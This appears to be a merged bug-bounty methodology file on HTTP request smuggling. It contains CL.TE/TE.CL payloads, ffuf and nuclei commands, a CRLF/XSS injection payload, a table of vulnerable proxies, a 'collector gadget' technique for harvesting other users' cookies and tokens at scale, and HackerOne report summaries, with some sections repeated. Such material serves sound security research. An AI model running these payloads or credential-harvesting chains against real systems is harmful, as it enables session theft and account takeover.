- **`web-cache`** — Smuggling + cache is the canonical critical chain; one smuggled request becomes the cached response for every subsequent victim. Chain primitive: CL.TE smuggle a request whose response body contains attacker HTML/JS → front-end cache stores it under a popular URL (`/`, `/login`) → de-sync poisoning where the smuggled request becomes the cached response for the next N victims, persisting for the cache TTL.
- **`auth-bypass`** — Smuggling reaches internal-only routes that the front-end WAF/auth-proxy filters out. Chain primitive: smuggle `GET /admin/users HTTP/1.1` past the front-end ACL that blocks external `/admin/*` → backend processes the smuggled request as if from a trusted internal source → bypass front-end auth by smuggling internal-routed request → admin data in the response queue.
- **`idor`** — Smuggling attaches the NEXT user's session cookies to an attacker-controlled request path. Chain primitive: smuggle `GET /api/me HTTP/1.1` with no cookies → backend pairs it with the next legitimate user's incoming connection cookies → victim's session cookie attached to attacker's smuggled request → attacker reads the response containing victim's PII/tokens.
- **`xss`** — Smuggling injects XSS payloads into the response stream of the next victim without ever appearing in a URL parameter. Chain primitive: smuggled request body contains reflected payload that the backend renders into the next response in the queue → next visitor to `/` receives attacker HTML inline → reflected XSS at every visitor without any URL parameter visible to them or to logs.
- **`security-arsenal`** — Reach for the smuggling payload bank (CL.TE / TE.CL / TE.TE obfuscations, H2.CL downgrade probes, h2csmuggler one-liners, Burp HTTP Request Smuggler extension config) and the time-delay confirmation template before manual hex-editing.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical: the smuggled-request effect MUST land on a request issued by a different client/session, not your own follow-up. A timing delta in your own browser alone is parser disagreement, not exploitable smuggling.

### Related Skills & Chains

- **`hunt-cache-poison`** — Smuggling + cache is the canonical critical chain; one smuggled request becomes the cached response for every subsequent victim. Chain primitive: CL.TE smuggle a request whose response body contains attacker HTML/JS → front-end cache stores it under a popular URL (`/`, `/login`) → de-sync poisoning where the smuggled request becomes the cached response for the next N victims, persisting for the cache TTL.
- **`hunt-auth-bypass`** — Smuggling reaches internal-only routes that the front-end WAF/auth-proxy filters out. Chain primitive: smuggle `GET /admin/users HTTP/1.1` past the front-end ACL that blocks external `/admin/*` → backend processes the smuggled request as if from a trusted internal source → bypass front-end auth by smuggling internal-routed request → admin data in the response queue.
- **`hunt-idor`** — Smuggling attaches the NEXT user's session cookies to an attacker-controlled request path. Chain primitive: smuggle `GET /api/me HTTP/1.1` with no cookies → backend pairs it with the next legitimate user's incoming connection cookies → victim's session cookie attached to attacker's smuggled request → attacker reads the response containing victim's PII/tokens.
- **`hunt-xss`** — Smuggling injects XSS payloads into the response stream of the next victim without ever appearing in a URL parameter. Chain primitive: smuggled request body contains reflected payload that the backend renders into the next response in the queue → next visitor to `/` receives attacker HTML inline → reflected XSS at every visitor without any URL parameter visible to them or to logs.
- **`security-arsenal`** — Reach for the smuggling payload bank (CL.TE / TE.CL / TE.TE obfuscations, H2.CL downgrade probes, h2csmuggler one-liners, Burp HTTP Request Smuggler extension config) and the time-delay confirmation template before manual hex-editing.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical: the smuggled-request effect MUST land on a request issued by a different client/session, not your own follow-up. A timing delta in your own browser alone is parser disagreement, not exploitable smuggling.

### Tools and wordlists

### Tools

`Burp HTTP Request Smuggler` · `smuggler.py` · `h2cSmuggler`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_request-smuggling.txt` | 94 |
| `~/.local/share/hackerone-reports/wordlists/params_request-smuggling.txt` | 17 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_request-smuggling.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_request-smuggling.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Use Burp HTTP Request Smuggler / smuggler.py against CDN+origin pairs; Nuclei coverage is limited.

```sh
nuclei -u https://target -tags smuggling,http-smuggling \
       -severity low,medium,high,critical -rl 40 -o nuclei_request-smuggling.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class request-smuggling --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class request-smuggling
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class request-smuggling
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class request-smuggling --min-bounty 1000
```

### Related

- `hackerone-web-cache` (68 reports)
- `hackerone-ssrf` (337 reports)

### Related

- `web-cache` (68 reports)
- `ssrf` (337 reports)

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/research/http1-must-die
2. https://portswigger.net/web-security/request-smuggling
3. https://portswigger.net/web-security/request-smuggling/advanced
4. https://portswigger.net/research/http2
5. https://blogs.jsmon.sh/http-2-request-smuggling-why-h2-cl-h2-te-and-browser-desync-still-pay
6. https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling
7. https://www.usenix.org/system/files/usenixsecurity25-mu.pdf

### Additional notes

### Parameters observed

`ver` · `mode` · `name` · `step` · `verify_token` · `param` · `authenticity_token` · `attributes[delivery-min-days]` · `attributes[delivery-max-days]` · `attributes[locale]` · `access_token` · `_fd` · `_ga` · `id` · `aeRg` · `e3t5b` · `mt`

### Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies

`#737140` · Slack · $0 · critical · 2020-03-12 · ▲870
> Hi Slack Security Team! My name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a month long bounty promotion I decided to take a little of my time and gently perform recon on your platform. Specifically the area of interest I focus in is HTTP Request Smuggling. I developed tooling to actively target some advanced HTTP Smuggling exploits and ran it on your in-scope assets.

### Stored XSS on https://paypal.com/signin via cache poisoning

`#488147` · PayPal · $18,900 · high · 2019-08-07 · ▲685
> Due to a configuration in frontend, caching servers, it was possible for a researcher to use request smuggling to convert a page request into a cached redirect. If the cached redirect were accessed by a legitimate user, an attacker's content would be rendered instead of the requested page. While this would not impact any back-end data, this could interfere with the integrity of certain pages, including potential interference with the sign-in page.

### Request smuggling on admin-official.line.me could lead to account takeover

`#740037` · LY Corporation · $0 · high · 2020-05-19 · ▲565
> The reporter identified a request smuggling issue on admin-official.line.me (TE.CL-type). The reporter clearly illustrated the impact without putting our users at risk or affecting the stability of our service. For this we would like to thank @shaolin tw! This issue was the result of how our load balancers were forwarding requests to the backend services.

### Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com

`#771666` · Eternal · $0 · critical · 2020-07-09 · ▲559
> Intro Hi Zomato Security Team! My name is Evan Custodio and this is my first time evaluating your platform. I specialize in looking for server-side vulnerabilities. Recently I've taken a deep look at HTTP Request Smuggling issues. I have custom tools to evaluate over 150 types of HTTP Smuggling Payloads.

### 17. HTTP REQUEST SMUGGLING

> Lowest dup rate. $5K–$30K. PortSwigger research by James Kettle.

### CL.TE (Content-Length front, Transfer-Encoding back)

```http
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### Detection

```
1. Burp extension: HTTP Request Smuggler
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. Manual timing: CL.TE probe + ~10s delay = backend waiting for rest of body
```

### Target-Suitability Matrix (2026 reality check)

The classic CL.TE / TE.CL payloads are NOT universally exploitable in 2026. Modern proxies are RFC 9112 strict by default. Fingerprint the front-end BEFORE investing time.

| Front-end | CL.TE | TE.CL | H2.CL | H2.TE | Notes |
|---|---|---|---|---|---|
| **Nginx ≥ 1.21** | NO | NO | partial (H2 ingress) | partial | RFC-strict; rejects CL+TE with HTTP 400. Verified locally on Nginx 1.27 — all 9 documented variants killed by front-end ([docs/verification/phase2h-smuggling-cachepoison.md](../../docs/verification/phase2h-smuggling-cachepoison.md)). |
| **Caddy 2.x** | NO | NO | — | — | Hardened by default |
| **Envoy ≥ 1.20** | NO | NO | partial | partial | Hardened in most paths |
| **HAProxy ≤ 2.4** | ✓ | ✓ | — | — | **Vulnerable**, see CVE-2021-40346 |
| **AWS ALB + specific upstream** | partial | partial | ✓ | ✓ | Several disclosed-paid reports 2022-2024 |
| **Cloudflare → S3 / Lambda chains** | — | — | ✓ | ✓ | H2-downgrade attacks remain viable |
| **Older F5 BIG-IP (TMM < 16)** | ✓ | — | — | — | Vendor advisories |
| **Citrix ADC / NetScaler (older firmware)** | ✓ | ✓ | — | — | Disclosed in 2020-2022 |
| **Squid 3.x** | ✓ | — | — | — | Older deployments |
| **Apache Traffic Server (older)** | ✓ | ✓ | ✓ | ✓ | PortSwigger research |
| **Apache mod_proxy_ajp → Tomcat** | — | — | — | — | Cross-protocol HTTP→AJP desync (CVE-2022-26377); smuggled request is opaque to the WAF and reaches internal AJP admin/status paths that lack the external auth controls |
| **Custom Python / Go proxies** | ✓ | ✓ | — | — | Frequently miss RFC enforcement |

### Operator fingerprint quick-check

```bash
curl -sI https://target/ | grep -i "Server:"
```

- `nginx/1.21+`, `Caddy`, `envoy` → CL/TE classic is dead — pivot to H2.CL/H2.TE if the front-end speaks HTTP/2, or look for legacy proxies upstream
- `HAProxy`, header points to AWS/CDN → run the full payload matrix
- No Server header → assume hardened, but run a single quick `space-before-colon` probe; if it doesn't 400, dig deeper

### H2.CL / H2.TE (the modern dominant vector)

H2-downgrade smuggling attacks rely on the front-end speaking HTTP/2 to the client and HTTP/1.1 to origin. The downgrade introduces CL/TE confusion because HTTP/2's frame-length headers don't survive the conversion cleanly. Most CDN+origin chains in 2024-2026 use this exact topology.

Tools that send HTTP/2 raw frames (Burp Pro's HTTP Request Smuggler extension, `h2csmuggler`, `smuggler.py`) are the right starting point against CDN-fronted targets. Avoid HTTP/1.1-only test clients (curl, raw sockets) against H2-front-ended targets — you'll send the wrong protocol entirely.

### Mass credential harvesting — the "collector gadget"

The highest-impact smuggling outcome needs no per-victim interaction. Instead of blindly poisoning the queue, smuggle a request aimed at a **back-end handler that echoes the full request** — a search endpoint that reflects headers, or a redirect that mirrors the request line. The next victim's headers (`Cookie`, `Authorization`, `X-Access-Token`) get attributed to your smuggled request, and the reflecting handler returns them **in a response you read**. Repeated on a busy keep-alive socket, this harvests live credentials from arbitrary users at scale — and it works even through a CDN (Akamai/Cloudflare) when the CDN↔origin hop desyncs. Chains to `account-takeover`.

---

### Mass credential harvesting — the "collector gadget"

The highest-impact smuggling outcome needs no per-victim interaction. Instead of blindly poisoning the queue, smuggle a request aimed at a **back-end handler that echoes the full request** — a search endpoint that reflects headers, or a redirect that mirrors the request line. The next victim's headers (`Cookie`, `Authorization`, `X-Access-Token`) get attributed to your smuggled request, and the reflecting handler returns them **in a response you read**. Repeated on a busy keep-alive socket, this harvests live credentials from arbitrary users at scale — and it works even through a CDN (Akamai/Cloudflare) when the CDN↔origin hop desyncs. Chains to `hunt-ato`.

---

## Companion methodology (complete, deduplicated)

Full text of every non-SKILL.md methodology document from the contributing skills.

### Companion: hunting / references/payloads.md

# Request Smuggling — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- CL.TE -> `Content-Length: 13` + `Transfer-Encoding: chunked`

- TE.CL -> chunked body with a smaller Content-Length

- TE.TE -> `Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked`

- HTTP/2 -> `Transfer-Encoding: chunked` injected as a header



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 6× | `\r\r` |

| 4× | `\r\n` |

| 3× | `{size}` |

| 3× | `auth_digest_string_quoted()` |

| 3× | `parse_conversion()` |

| 2× | `GET https://<URL> HTTP/1.1` |

| 2× | `r\n` |

| 2× | `Connection: close\t` |

| 2× | `http.createServer()` |

| 2× | `Content-Length: 6\r\n\r\nHello A` |

| 2× | `http_req_set_reader()` |

| 2× | `http://newscdn.starbucks.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0` |

| 2× | `is_custom_fetch_listing_match()` |

| 2× | `imap_state_listsearch_resp()` |

| 2× | `Curl_pp_readresp()` |

| 2× | `printf "POST / HTTP/1.1\r\n"\ / "Host: localhost:5000\r\n"\ / "X-Abc:\rxTransfer-Encoding: chunked\r\n"\ / "\r\n"\ / "1\r\n"\ / "A\r\n"\ / ` |

| 2× | `Response / { host: 'localhost:5000', 'x-abc': '', 'transfer-encoding': 'chunked' } / A / ---` |

| 2× | `[\r]xTransfer-Encoding: chunked[\r\n]` |

| 2× | `legit@example.com` |

| 2× | `{50}` |



## Parameters observed



`ver` · `mode` · `name` · `step` · `verify_token` · `param` · `authenticity_token` · `attributes[delivery-min-days]` · `attributes[delivery-max-days]` · `attributes[locale]` · `access_token` · `_fd` · `_ga` · `id` · `aeRg` · `e3t5b` · `mt`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_request-smuggling.txt` | 94 |

| `~/.local/share/hackerone-reports/wordlists/params_request-smuggling.txt` | 17 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_request-smuggling.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_request-smuggling.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Use Burp HTTP Request Smuggler / smuggler.py against CDN+origin pairs; Nuclei coverage is limited.



```sh

nuclei -u https://target -tags smuggling,http-smuggling \

       -severity low,medium,high,critical -rl 40 -o nuclei_request-smuggling.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Companion: hunting / references/techniques.md

# Request Smuggling — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Identify proxy/CDN + origin stack and HTTP version handling.

- Test CL.TE, TE.CL, TE.TE obfuscation, and HTTP/2 downgrade desync.

- Use timing-based and differential probes before exploitation.

- Check connection reuse, pipelining, and hop-by-hop headers.



## Bypass tricks



- Obfuscate TE with case, spaces, tabs, and duplicate headers.

- Exploit front-end/back-end parser differences in header folding.

- Use cache deception/poisoning to prove impact.



## Deeper checklist



- Identify proxy/CDN + origin stacks and HTTP version handling.

- Test CL.TE, TE.CL, TE.TE obfuscation, and HTTP/2 downgrade desync.

- Use timing-based and differential probes before attempting exploitation.

- Check connection reuse, pipelining, and hop-by-hop header handling.

- Demonstrate a controlled impact: poisoning another user's request or bypassing controls.

- Keep payloads minimal and avoid disrupting production traffic.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **Bypass for #488147 enables stored XSS on https://paypal.com/signin again** — `#510152` · PayPal · $20,000 · ▲2687

  > I've posted a full writeup over at https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn

- **Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies** — `#737140` · Slack · $0 · ▲870

  > The CLTE issue found on slackb.com is when the frontend server interprets the request sized using `Content-Length` and the backend server interprets the request using the `Transfer-Encoding: chunked` method.

- **Request smuggling on admin-official.line.me could lead to account takeover** — `#740037` · LY Corporation · $0 · ▲565

  > The reporter identified a request smuggling issue on admin-official.line.me [(TE.CL-type).](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) The reporter clearly illustrated the impact without putting our users at risk or…

- **Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com** — `#771666` · Eternal · $0 · ▲559

  > It appears when you smuggle and hijack an HTTP request and you change the request endpoint to be: `https://some.host.name/desync/` on the request line the backend server should never see a request like this because the frontend server immediately returns `404…

- **HTTP request Smuggling** — `#867952` · Helium · $0 · ▲300

  > console.helium.com s vulnerable to CL TE ( Front end server uses Content-Length , Back-end Server uses Transfer-encoding ) HTTP request smuggling attack.

- **HTTP Request Smuggling on https://labs.data.gov** — `#726773` · GSA Bounty · $750 · ▲160

  > The application appears to be vulnerable to HTTP request smuggling due to a disagreement between the front-end and back-end server, where the front-end server uses the Transfer-Encoding header to determine content in the HTTP body, but back-end server uses…

- **HTTP Response Header Injection in shopify/pitchfork + Rack 3** — `#2279572` · Shopify · $800 · ▲136

  > Header injection succeeds in case of `r\n` and `\n`.

- **HTTP Request Smuggling due to CR-to-Hyphen conversion** — `#922597` · Node.js · $0 · ▲134

  > Node then silently discards the expected 42 bytes of the body of the first request, and thus starts parsing the 2nd request from GET /node sees this.

- **Improper HTTP header block termination in llhttp** — `#2054283` · Node.js · $0 · ▲122

  > A flaw in Node.js 20's HTTP parser allows improper termination of HTTP/1 headers using `\r\n\rX` instead of the required `\r\n\r\n`.

- **HTTP Request Smuggling in Transform Rules using hexadecimal escape sequences in the concat() function** — `#1478633` · Cloudflare Public Bug Bounty · $6,000 · ▲116

  > When combined with a POST body such as `0\r\n\r\nGET / HTTP/1.1\r\nHost: internal.example.com\r\n\r\n` it made HTTP request smuggling extremely trivial.

- **Possibility of Request smuggling attack** — `#2280391` · Internet Bug Bounty · $4,660 · ▲93

  > A trailer header that exceeded the header size limit could cause Tomcat to treat a single request as multiple requests leading to the possibility of request smuggling when behind a reverse proxy.

- **Pause-based desync in Apache HTTPD** — `#1667974` · Internet Bug Bounty · $4,000 · ▲74

  > This vulnerability is described in detail in my whitepaper here: https://portswigger.net/research/browser-powered-desync-attacks pause

- **HTTP Smuggling multiple issues in Squid 3.x & squid 4.x** — `#758445` · Internet Bug Bounty · $0 · ▲74

  > For issues ` 3` & ` 4` I'm pretty sure that I will make reports later.

- **HTTP SMUGGLING EXPOSED HMAC/DOS** — `#753939` · Magic · $0 · ▲74

  > Using the transfer-encoding header and following it with a zero.

- **CVE-2024-21733 Apache Tomcat HTTP Request Smuggling (Client- Side Desync) (CWE: 444)** — `#2327341` · Internet Bug Bounty · $4,660 · ▲57

  > Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng, / ;q=0.8,application/signed-exchange;v=b3;q=0.7

- **HTTP Request Smuggling via Unsanitized Hop-by-Hop Headers** — `#3622877` · Cloudflare Public Bug Bounty · $1,500 · ▲54

  > Pingora could forward h2c upgrade requests in HTTP/1 to upstream servers, allowing subsequent h2c requests over the upgraded connection to bypass request-level filters applied by the proxy.

- **Potential HTTP Request Smuggling in ruby webrick** — `#965267` · Ruby · $0 · ▲53

  > When using webrick as a http server, a attacker may use a header to fake a legal header.

- **Request Smuggling in Apache Tomcat (Important, CVE-2023-45648)** — `#2299692` · Internet Bug Bounty · $4,660 · ▲51

  > If we send the following payload, the headers of the second request (Line 12-15) will be regarded as the trailer section of the first request, while the content of the second request (Line 17-19) is processed as the second request.

- **HTTP Request Smuggling via Connection: close<TAB> in Node.js llhttp parser** — `#3723248` · Node.js · $0 · ▲49

  > In my test, a single TCP write containing a POST followed by `GET /smuggled` results in the application receiving two request events.

- **HTTP request smuggling with Origin Rules using newlines in the host_header action parameter** — `#1575912` · Cloudflare Public Bug Bounty · $3,100 · ▲46

  > The `host header` action parameter available to rulesets in the [Origin Rules API](https://developers.cloudflare.com/rules/origin-rules/) lacked sufficient input validation i.e., allowing CRLF characters.

- **Http request splitting** — `#409943` · Node.js · $0 · ▲45

  > [https://twitter.com/YShahinzadeh/status/1039396394195451904](https://twitter.com/YShahinzadeh/status/1039396394195451904)

- **HTTP Request Smuggling** — `#1120982` · U.S. Dept Of Defense · $0 · ▲40

  > Reference: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

- **[m.airbnb.com] CRLF Injection** — `#197279` · Airbnb · $2,500 · ▲37

  > By using a URL-escaped character sequence, bobrov was able to inject HTTP headers into the responses of some redirects on the m.airbnb.com domain.

- **Potential HTTP Request Smuggling in nodejs** — `#1002188` · Node.js · $250 · ▲34

  > for example, we can send two `Transfer-Encoding` header field, even if one of them is false header field.

- **Improper Input Validation — HTTP Response Parser Unconditionally Accepts Bare CR in Status Line** — `#3648681` · Node.js · $0 · ▲30

  > This means a second `\r` is consumed and treated as a valid line ending, transitioning the parser to header processing without requiring the mandatory LF (`\n` / `0x0A`) that RFC 7230 §3.1.2 demands.

- **HTTP/1.1 Response Desynchronization via conflicting CL/TE headers in Proxy CONNECT** — `#3623064` · curl · $0 · ▲30

  > curl fails to prioritize the `Transfer-Encoding: chunked` header over `Content-Length` in HTTP/1.1 proxy responses (specifically 407/401 auth challenges), violating RFC 9112 Section 6.1.

- **HTTP request smuggling on Basecamp 2 allows web cache poisoning** — `#919175` · Basecamp · $0 · ▲28

  > Using HTTP request smuggling attack, It is possible to poison the cache with the off-site redirect response using `X-Forwarded-Host` request header in smuggled request.

- **Host Header Injection** — `#1098948` · Kartpay · $0 · ▲27

  > For example Joomla used to write Host header to every page without HTML Encoding like this: <link href=”http:// SERVER['HOST']” which led to cross site scripting.

- **Unauthenticated request smuggling on launchpad.37signals.com** — `#867577` · Basecamp · $0 · ▲27

  > The desync occurs when sending a request with a `Content-Length` header and a valid `Transfer-Encoding` header followed by an invalid `Transfer-Encoding` header.

- **HTTP/1.1 response framing violation and unsafe connection reuse when transfer decoding is disabled** — `#4025056` · curl · $0 · ▲26

  > libcurl can incorrectly reuse an HTTP/1.1 connection after a response containing both `Content-Length` and a non-chunked `Transfer-Encoding` when transfer decoding is disabled with `CURLOPT HTTP TRANSFER DECODING = 0L` (`--raw` behavior).



## Case studies



### Bypass for #488147 enables stored XSS on https://paypal.com/signin again

`#510152` · PayPal · $20,000 · high · 2019-08-07 · ▲2687

> Due to a configuration in frontend, caching servers, it was possible for a researcher to use request smuggling to convert a page request into a cached redirect. If the cached redirect were accessed by a legitimate user, an attacker's content would be rendered instead of the requested page. While this would not impact any back-end data, this could interfere with the integrity of certain pages, including potential interference with the sign-in page.



### Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies

`#737140` · Slack · $0 · critical · 2020-03-12 · ▲870

> Hi Slack Security Team! My name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a month long bounty promotion I decided to take a little of my time and gently perform recon on your platform. Specifically the area of interest I focus in is HTTP Request Smuggling. I developed tooling to actively target some advanced HTTP Smuggling exploits and ran it on your in-scope assets.



### Stored XSS on https://paypal.com/signin via cache poisoning

`#488147` · PayPal · $18,900 · high · 2019-08-07 · ▲685

> Due to a configuration in frontend, caching servers, it was possible for a researcher to use request smuggling to convert a page request into a cached redirect. If the cached redirect were accessed by a legitimate user, an attacker's content would be rendered instead of the requested page. While this would not impact any back-end data, this could interfere with the integrity of certain pages, including potential interference with the sign-in page.



### Request smuggling on admin-official.line.me could lead to account takeover

`#740037` · LY Corporation · $0 · high · 2020-05-19 · ▲565

> The reporter identified a request smuggling issue on admin-official.line.me (TE.CL-type). The reporter clearly illustrated the impact without putting our users at risk or affecting the stability of our service. For this we would like to thank @shaolin tw! This issue was the result of how our load balancers were forwarding requests to the backend services.



### Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com

`#771666` · Eternal · $0 · critical · 2020-07-09 · ▲559

> Intro Hi Zomato Security Team! My name is Evan Custodio and this is my first time evaluating your platform. I specialize in looking for server-side vulnerabilities. Recently I've taken a deep look at HTTP Request Smuggling issues. I have custom tools to evaluate over 150 types of HTTP Smuggling Payloads.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class request-smuggling --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class request-smuggling

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class request-smuggling

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class request-smuggling --min-bounty 1000

```

## Corpus wordlists (mined)

### `params_request-smuggling.txt`

```text
ver
mode
name
step
verify_token
param
authenticity_token
attributes[delivery-min-days]
attributes[delivery-max-days]
attributes[locale]
checkout[shipping_address][country]
access_token
_fd
id
aeRg
e3t5b
mt
```

### `paths_request-smuggling.txt`

```text
/flag
/doc/html/rfc7230
/smuggled
/admin
/cgi-bin/cvename.cgi
/login
/data/definitions/33.html
/data/definitions/444.html
/proxy_sees_this
/node_sees_this
/index.html
/rfc/rfc9110
/page2
/two
/security/vulnerabilities_24.html
/en/docs/guides/anatomy-of-an-http-transaction/
/hello
/bye
/2020/05/28/hiding-in-plain-sight-http-request-smuggling/
/sf
/sf/
/user/validate_link
/v2/tabbed/home
/desync
/v2/userdetails.json/
/some/other/endpoint
/desync/
/v2/auth
/api/sessions
/hopefully404
/unicorn-public/20210226111552.GA22901@dcvr/T/
/).each
/nginx.conf:/etc/nginx/nginx.conf:ro
/examples/test.jsp
/examples/
/Advisories/SQUID-2019_10.txt
/foo.html
/bar.html
/fr-fr/security/cve/CVE-2019-18678/
/security-9.html
/security-8.html
/chunked/io
/evil_path
/benign_path
/HTTP
/first
/rules/origin-rules/
/cloudflare-one/identity/users/validating-json
/private
/404_not_found.html
/;httponly;secure
/page1
/r/enjv2g5042bg
/4618984/account
/signin
/identity/edit
/identity
/path/to/curl/source
/path/to/curl/build
/cart/24637376965:6,24637373189:10,24637375493:10
/nginx/rev/15a15f6ae3a2
/nginx/ticket/762
/pipermail/websecurity_lists.webappsec.org/2006-February/000836.html
/2013/05/practical-http-host-header-attacks.html
/bugzilla/show_bug.cgi
/english/security/2019/04/24/security_jetty_http_smuggling/
/html/rfc7230
/c/go/+/18871
/security/english/2015/10/04/http_smuggling_in_2015_part_one
/english/security/2018/07/03/security_pound_http_smuggling/
/nginx/ticket/1014
/english/security/2015/03/25/nginx-integer_truncation/
/archive/1/425593
/oss-sec/2016/q2/95
/one
/sdk/latest.json
/req3
/req2
/vuln/detail/CVE-2022-35256
/indeks
/sign-up
/publishers/registrations.json
/docs/2.4/mod/core.html
/contact/
/path
/package/fastify
/errata/eid4667
/forbidden
/poc-scratch/reproduce.sh
/src
/doc/html/draft-ietf-httpbis-rfc6265bis-03
/ja/latest/class/CGI=3a=3aCookie.html
/in/app/brave-web-browser/id1052879175
/http-header-check/
```

## Source skills merged into this topic

- `h1skills` — `hackerone-request-smuggling`
- `hunting` — `request-smuggling`
- `cbh` — `hunt-http-smuggling`

## Provenance

- `references/unified-method.md` — same deduplicated union as this file, for tooling
- `references/upstream-*.md` — unmodified original SKILL.md from each repo
- `references/upstream-assets/` — 2 companion files
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
